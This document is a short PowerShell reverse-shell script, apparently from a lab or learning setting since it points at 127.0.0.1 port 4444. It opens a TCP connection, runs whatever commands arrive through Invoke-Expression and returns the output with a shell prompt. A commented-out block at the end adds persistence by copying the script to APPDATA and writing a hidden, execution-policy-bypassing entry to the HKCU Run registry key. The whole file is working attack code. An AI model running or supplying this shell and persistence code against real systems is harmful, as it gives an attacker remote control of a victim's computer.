$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }

while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    try {
        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    } catch {
        $sendback = $_.Exception.Message
    }
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
    $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()


# pause for debugging
Read-Host -Prompt "Press Enter to exit"

# for persistence (tbd)
# $scriptPath = "$env:APPDATA\rev.ps1"
#Copy-Item .\powershell_reverse.ps1 $scriptPath
#Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "rev" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"
